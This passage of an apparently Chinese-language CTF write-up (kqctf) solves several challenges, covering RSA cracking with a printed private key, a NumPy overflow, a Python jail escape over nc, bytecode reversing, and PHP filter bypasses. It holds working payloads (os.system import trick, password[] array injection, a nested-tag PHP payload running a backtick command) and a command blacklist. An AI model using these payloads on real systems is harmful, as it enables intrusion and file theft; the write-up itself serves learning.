PRIVATE KEY-----\nMIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1\ne+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4\nO7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn\ndmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m\nlW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs\npet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z\nKFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs\ndBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o\n19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2\nAis+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S\nwFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH\n60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO\nTruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT\ngMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH\nz0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs\nmb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U\nHxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G\nn/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C\nRn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2\nra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ\nWvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN\nI4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q\ntOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt\nhfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG\nSpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll\n-----END RSA PRIVATE KEY-----\n</code></pre>\n<p>编写代码,用RSA解密</p>\n<pre><code class=\"python\">from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher\nimport base64\nc = &#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39;\n\nwith open(&#39;a.pem&#39;,&#39;r&#39;) as f:\n    pri_key = RSA.importKey(f.read())\n    cipher = PKCS1_cipher.new(pri_key)\n    plain = cipher.decrypt(base64.b64decode(c), 0)\n    print(plain)\n</code></pre>\n<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0&#125;</code></p>\n<h1 id=\"Road-Safety-Association\"><a href=\"#Road-Safety-Association\" class=\"headerlink\" title=\"Road_Safety_Association\"></a>Road_Safety_Association</h1><p><em>That’s what it stands for, right?</em></p>\n<hr>\n<p>题目给了c,p,q,e的值,直接求d解密即可<br>代码:</p>\n<pre><code class=\"python\">import gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\nc = 34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618\np = 7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969\nq = 11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857\ne = 65537\n\nn = p * q\nphi = (p-1) * (q-1)\nd = gmpy2.invert(e, phi)\nx = pow(c, d, n)\nprint(x)\nprint(long_to_bytes(x))\n</code></pre>\n<p><strong>flag:</strong><code>kqctf&#123;y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc&#125;</code></p>\n<h1 id=\"Hammer-To-Fall\"><a href=\"#Hammer-To-Fall\" class=\"headerlink\" title=\"Hammer To Fall\"></a>Hammer To Fall</h1><p><em>Dynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number})</em></p>\n<hr>\n<p>源文件:</p>\n<pre><code class=\"python\">import numpy as np\n\na = np.array([0], dtype=int)\nval = int(input(&quot;This hammer hits so hard it creates negative matter\\n&quot;))\nif val == -1:\n    exit()\na[0] = val\na[0] = (a[0] * 7) + 1\nprint(a[0])\nif a[0] == -1:\n    print(&quot;flag!&quot;)\n</code></pre>\n<p><code>NumPy</code>中的int使用的是C中的long,参照<a href=\"https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_\">NumPy文档</a>,最大值为9223372036854775807</p>\n<pre><code class=\"python\">&gt;&gt;&gt; 9223372036854775807 // 7 * 2\n2635249153387078802\n</code></pre>\n<p><strong>flag:</strong><code>kqctf&#123;2635249153387078802&#125;</code></p>\n<h1 id=\"I-want-to-break-free\"><a href=\"#I-want-to-break-free\" class=\"headerlink\" title=\"I want to break free\"></a>I want to break free</h1><p><em>I want to break free… from this Python jail. nc 143.198.184.186 45457</em></p>\n<hr>\n<p>使用<code>&#39;o&#39;+&#39;s&#39;</code>绕过对os的过滤,执行ls命令,发现存在文件<code>cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt</code></p>\n<pre><code class=\"shell\">~$ nc 143.198.184.186 45457\n\n    You are in jail. Can you escape?\n\n&gt; __builtins__.__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;)\nbin\nblacklist.txt\nboot\ncf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt\ndev\netc\nhome\njail.py\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\nNone\n</code></pre>\n<p>读取文件内容</p>\n<pre><code class=\"shell\">&gt; print(__builtins__.open(&#39;cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt&#39;).read())\nkqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;\n\nNone\n</code></pre>\n<p><strong>flag:</strong><code>kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125;</code></p>\n<h1 id=\"sneeki-snek\"><a href=\"#sneeki-snek\" class=\"headerlink\" title=\"sneeki snek\"></a>sneeki snek</h1><p><em>ssssssssssssssssssssssssssssssssssssss</em></p>\n<hr>\n<p>根据字节码还原文件:</p>\n<pre><code class=\"python\">f = &#39;&#39;\na = &#39;rwhxi&#125;eomr\\\\^`Y&#39;\nz = &#39;f]XdThbQd^TYL&amp;\\x13g&#39;\na = a + z\nfor i,b in enumerate(a):\n    c = ord(b)\n    c = c - 7\n    c = c+i\n    f += chr(c)\n\nprint(f)\n</code></pre>\n<p><strong>flag:</strong><code>kqctf&#123;dont_be_mean_to_snek_:(&#125;</code></p>\n<h1 id=\"sneeki-snek-2-oh-no-what-did-i-do\"><a href=\"#sneeki-snek-2-oh-no-what-did-i-do\" class=\"headerlink\" title=\"sneeki snek 2 oh no what did i do\"></a>sneeki snek 2 oh no what did i do</h1><p><em>did snek steal your pasta because this is some spaghetti</em></p>\n<hr>\n<p>根据字节码还原文件:</p>\n<pre><code class=\"python\">a = list()\na.append(1739411)\na.append(1762811)\na.append(1794011)\na.append(1039911)\na.append(1061211)\na.append(1718321)\na.append(1773911)\na.append(1006611)\na.append(1516111)\na.append(1739411)\na.append(1582801)\na.append(1506121)\na.append(1783901)\na.append(1783901)\na.append(1773911)\na.append(1582801)\na.append(1006611)\na.append(1561711)\na.append(1039911)\na.append(1582801)\na.append(1773911)\na.append(1561711)\na.append(1582801)\na.append(1773911)\na.append(1006611)\na.append(1516111)\na.append(1516111)\na.append(1739411)\na.append(1728311)\na.append(1539421)\n\nb = &#39;&#39;\nfor i in a:\n    c = str(i)\n    c=c[::-1]\n    c= c[:-1]\n    c = int(c)\n    c = 5 ^ c\n    c= c - 55555\n    c = c // 555\n    b = b + chr(c)\nprint(b)\n</code></pre>\n<p><strong>flag:</strong><code>kqctf&#123;snek_waas_not_so_sneeki&#125;</code></p>\n<h1 id=\"Just-Not-My-Type\"><a href=\"#Just-Not-My-Type\" class=\"headerlink\" title=\"Just Not My Type\"></a>Just Not My Type</h1><p><em>I really don’t think we’re compatible (<a href=\"http://143.198.184.186:7000/\">Link</a>)</em></p>\n<hr>\n<p>源文件:</p>\n<pre><code class=\"php+HTML\">&lt;h1&gt;I just don&#39;t think we&#39;re compatible&lt;/h1&gt;\n&lt;?php\n$FLAG = &quot;shhhh you don&#39;t get to see this locally&quot;;\nif ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) \n&#123;\n    $password = $_POST[&quot;password&quot;];\n    if (strcasecmp($password, $FLAG) == 0) &#123;\n        echo $FLAG;\n    &#125; \n    else &#123;\n        echo &quot;That&#39;s the wrong password!&quot;;\n    &#125;\n&#125;\n?&gt;\n&lt;form method=&quot;POST&quot;&gt;\n    Password\n    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;\n    &lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n</code></pre>\n<p><strong>Payload</strong></p>\n<pre><code class=\"php+HTML\">password[]=123\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125;</code></p>\n<h1 id=\"PHat-Pottomed-Girls\"><a href=\"#PHat-Pottomed-Girls\" class=\"headerlink\" title=\"PHat Pottomed Girls\"></a>PHat Pottomed Girls</h1><p><em>Now it’s attempt number 3 and this time with a Queen reference! (flag is in the root directory)</em></p>\n<hr>\n<p>源文件:</p>\n<pre><code class=\"php+HTML\">&lt;?php\nsession_start();\n\nfunction generateRandomString($length = 15) &#123;\n    $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;\n    $charactersLength = strlen($characters);\n    $randomString = &#39;&#39;;\n    for ($i = 0; $i &lt; $length; $i++) &#123;\n        $randomString .= $characters[rand(0, $charactersLength - 1)];\n    &#125;\n    return $randomString;\n&#125;\nfunction filter($originalstring) &#123;\n    $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring);\n    $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd);\n\n    $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd);\n    $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd);\n\n    return $notetoadd;\n&#125;\n\nif(isset($_POST[&quot;notewrite&quot;])) &#123;\n    $newnote = $_POST[&quot;notewrite&quot;];\n\n    //3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :)\n    $notetoadd = filter($newnote);\n    $notetoadd = filter($notetoadd);\n    $notetoadd = filter($notetoadd);\n\n    $filename = generateRandomString();\n    array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;);\n    file_put_contents(&quot;$filename.php&quot;, $notetoadd);\n    header(&quot;location:index.php&quot;);\n&#125;\n</code></pre>\n<p><strong>Payload</strong></p>\n<pre><code class=\"php+HTML\">&lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php\n echo `sort /fffflaglaglaglag.php`;\n????&gt;&gt;&gt;&gt;\n</code></pre>\n<p><strong>flag:</strong><code>flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"CloudsourcingSourced in the cloud 使用RsaCtfTool破解公钥,将得到的私钥保存至a.pem ~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1 e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4 O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o 19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2 Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH 60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2 ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll -----END RSA PRIVATE KEY----- 编写代码,用RSA解密 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher import base64 c = &#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39; with open(&#39;a.pem&#39;,&#39;r&#39;) as f: pri_key = RSA.importKey(f.read()) cipher = PKCS1_cipher.new(pri_key) plain = cipher.decrypt(base64.b64decode(c), 0) print(plain) flag:kqctf&#123;y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0&#125; Road_Safety_AssociationThat’s what it stands for, right? 题目给了c,p,q,e的值,直接求d解密即可代码: import gmpy2 from Crypto.Util.number import long_to_bytes c = 34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618 p = 7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969 q = 11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857 e = 65537 n = p * q phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) x = pow(c, d, n) print(x) print(long_to_bytes(x)) flag:kqctf&#123;y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc&#125; Hammer To FallDynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number}) 源文件: import numpy as np a = np.array([0], dtype=int) val = int(input(&quot;This hammer hits so hard it creates negative matter\\n&quot;)) if val == -1: exit() a[0] = val a[0] = (a[0] * 7) + 1 print(a[0]) if a[0] == -1: print(&quot;flag!&quot;) NumPy中的int使用的是C中的long,参照NumPy文档,最大值为9223372036854775807 &gt;&gt;&gt; 9223372036854775807 // 7 * 2 2635249153387078802 flag:kqctf&#123;2635249153387078802&#125; I want to break freeI want to break free… from this Python jail. nc 143.198.184.186 45457 使用&#39;o&#39;+&#39;s&#39;绕过对os的过滤,执行ls命令,发现存在文件cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt ~$ nc 143.198.184.186 45457 You are in jail. Can you escape? &gt; __builtins__.__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;ls&#39;) bin blacklist.txt boot cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt dev etc home jail.py lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var None 读取文件内容 &gt; print(__builtins__.open(&#39;cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt&#39;).read()) kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125; None flag:kqctf&#123;0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc&#125; sneeki snekssssssssssssssssssssssssssssssssssssss 根据字节码还原文件: f = &#39;&#39; a = &#39;rwhxi&#125;eomr\\\\^`Y&#39; z = &#39;f]XdThbQd^TYL&amp;\\x13g&#39; a = a + z for i,b in enumerate(a): c = ord(b) c = c - 7 c = c+i f += chr(c) print(f) flag:kqctf&#123;dont_be_mean_to_snek_:(&#125; sneeki snek 2 oh no what did i dodid snek steal your pasta because this is some spaghetti 根据字节码还原文件: a = list() a.append(1739411) a.append(1762811) a.append(1794011) a.append(1039911) a.append(1061211) a.append(1718321) a.append(1773911) a.append(1006611) a.append(1516111) a.append(1739411) a.append(1582801) a.append(1506121) a.append(1783901) a.append(1783901) a.append(1773911) a.append(1582801) a.append(1006611) a.append(1561711) a.append(1039911) a.append(1582801) a.append(1773911) a.append(1561711) a.append(1582801) a.append(1773911) a.append(1006611) a.append(1516111) a.append(1516111) a.append(1739411) a.append(1728311) a.append(1539421) b = &#39;&#39; for i in a: c = str(i) c=c[::-1] c= c[:-1] c = int(c) c = 5 ^ c c= c - 55555 c = c // 555 b = b + chr(c) print(b) flag:kqctf&#123;snek_waas_not_so_sneeki&#125; Just Not My TypeI really don’t think we’re compatible (Link) 源文件: &lt;h1&gt;I just don&#39;t think we&#39;re compatible&lt;/h1&gt; &lt;?php $FLAG = &quot;shhhh you don&#39;t get to see this locally&quot;; if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) &#123; $password = $_POST[&quot;password&quot;]; if (strcasecmp($password, $FLAG) == 0) &#123; echo $FLAG; &#125; else &#123; echo &quot;That&#39;s the wrong password!&quot;; &#125; &#125; ?&gt; &lt;form method=&quot;POST&quot;&gt; Password &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; Payload password[]=123 flag:flag&#123;no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible&#125; PHat Pottomed GirlsNow it’s attempt number 3 and this time with a Queen reference! (flag is in the root directory) 源文件: &lt;?php session_start(); function generateRandomString($length = 15) &#123; $characters = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;; $charactersLength = strlen($characters); $randomString = &#39;&#39;; for ($i = 0; $i &lt; $length; $i++) &#123; $randomString .= $characters[rand(0, $charactersLength - 1)]; &#125; return $randomString; &#125; function filter($originalstring) &#123; $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring); $notetoadd = str_replace(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;flag&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;system&quot;, &quot;&quot;, $notetoadd); return $notetoadd; &#125; if(isset($_POST[&quot;notewrite&quot;])) &#123; $newnote = $_POST[&quot;notewrite&quot;]; //3rd times the charm and I&#39;ve learned my lesson. Now I&#39;ll make sure to filter more than once :) $notetoadd = filter($newnote); $notetoadd = filter($notetoadd); $notetoadd = filter($notetoadd); $filename = generateRandomString(); array_push($_SESSION[&quot;notes&quot;], &quot;$filename.php&quot;); file_put_contents(&quot;$filename.php&quot;, $notetoadd); header(&quot;location:index.php&quot;); &#125; Payload &lt;&lt;&lt;&lt;&lt;&lt;&lt;?php??php??php??php echo `sort /fffflaglaglaglag.php`; ????&gt;&gt;&gt;&gt; flag:flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;","summary":"CloudsourcingSourced in the cloud 使用RsaCtfTool破解公钥,将得到的私钥保存至a.pem ~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1 e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4 O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o 19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2 Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH 60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2 ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll -----END RSA PRIVATE KEY----- 